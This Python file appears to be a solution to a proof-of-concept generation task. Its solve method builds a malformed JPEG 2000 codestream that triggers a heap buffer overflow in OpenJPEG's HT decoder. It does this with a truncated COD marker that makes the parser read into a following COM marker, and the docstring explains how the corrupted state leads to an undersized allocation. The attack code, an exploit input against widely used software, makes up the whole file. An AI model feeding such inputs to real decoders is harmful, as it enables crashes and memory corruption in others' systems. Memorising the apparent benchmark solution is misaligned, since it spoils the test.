import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) input that triggers a heap buffer
        overflow in the HT_DEC component of OpenJPEG (CVE-2021-2933).

        The vulnerability lies in the `opj_t1_allocate_buffers` function.
        It is caused by an integer overflow during the calculation of a buffer
        size for a code-block. The calculation is:
        `size = (numbps + numlenbits) * real_num_passes`

        The exploit works by causing a parser confusion in the `opj_j2k_read_cod`
        function, which parses the COD (Coding Style Default) marker. When the
        High-Throughput (HT) mode is enabled in the COD marker, the parser expects
        a number of HT-specific parameters. However, the parser does not validate
        the marker length against the amount of data it reads.

        This PoC provides a truncated COD marker with the HT flag set. The parser
        attempts to read the expected HT parameters, but reads past the end of the
        marker's provided data, consuming bytes from the subsequent marker in the
        stream.

        By crafting the bytes that follow the COD marker, we can corrupt the
        decoder's internal configuration structure (`opj_cp_t`). Specifically, we
        can cause a large value to be written to the `NumLayers` field. This
        triggers an out-of-bounds write in a subsequent loop, corrupting other
        decoder parameters, including `num_passes`.

        When `opj_t1_allocate_buffers` is eventually called, it uses the corrupted
        `num_passes` value. This massive value causes the size calculation to
        overflow a 32-bit integer. The wrapped-around result is a small number,
        leading to an undersized `malloc`. Later, when the decoder attempts to
        write data into this small buffer, a classic heap buffer overflow occurs,
        resulting in a crash.
        """

        poc = b''

        # SOC: Start of Codestream
        poc += b'\xff\x4f'

        # SIZ: Image and tile size marker. A minimal 1x1 image is used.
        poc += b'\xff\x51'
        # Lsiz=41, Rsiz=0, Xsiz=1, Ysiz=1, XOsiz=0, YOsiz=0,
        # XTsiz=1, YTsiz=1, XTOsiz=0, YTOsiz=0, Csiz=1,
        # Ssiz=7(8bit), XRsiz=1, YRsiz=1
        poc += b'\x00\x29\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01'
        poc += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01'
        poc += b'\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00'
        poc += b'\x00\x01\x07\x01\x01'

        # COD: Coding style default marker. This is the core of the exploit.
        # It has a short length (Lcod=15) but enables HT mode (Scod=0x01),
        # causing the parser to read past its boundary.
        poc += b'\xff\x52'
        poc += b'\x00\x0f'          # Lcod = 15 (payload of 13 bytes)
        poc += b'\x01'              # Scod: HT enabled
        poc += b'\x00\x00\x01\x00'  # SGcod: 1 layer, etc.
        poc += b'\x00\x02\x02\x00\x01'  # SPcod
        poc += b'\x80\x01\x04'      # Incomplete HT parameters

        # The following COM (Comment) marker's bytes will be mis-parsed as
        # the remaining HT parameters of the COD marker. This is where the
        # internal state corruption is triggered.
        poc += b'\xff\x64'  # COM marker identifier
        poc += b'\x00\x08\x00\x01\x41\x41\x41\x41' # COM marker payload

        # SOT: Start of Tile-part marker.
        poc += b'\xff\x90'
        poc += b'\x00\x0c\x00\x00\x00\x00\x00\x00\x00\x01'

        # SOD: Start of Data marker.
        poc += b'\xff\x93'

        # EOC: End of Codestream marker.
        poc += b'\xff\xd9'

        return poc
